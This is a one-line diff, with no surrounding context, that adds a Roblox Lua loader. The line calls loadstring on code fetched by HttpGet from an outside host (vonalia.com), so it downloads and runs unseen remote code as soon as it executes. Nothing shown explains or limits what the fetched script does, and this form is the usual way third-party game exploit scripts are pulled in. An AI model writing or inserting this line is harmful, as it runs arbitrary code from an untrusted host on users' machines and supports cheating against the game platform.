@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vonalia.com/api/system-v1/cached-scripts/1780443379007/zADVs55Ind3jKbaZuydQA17yJy34gzHf5DeYP7hH"))()
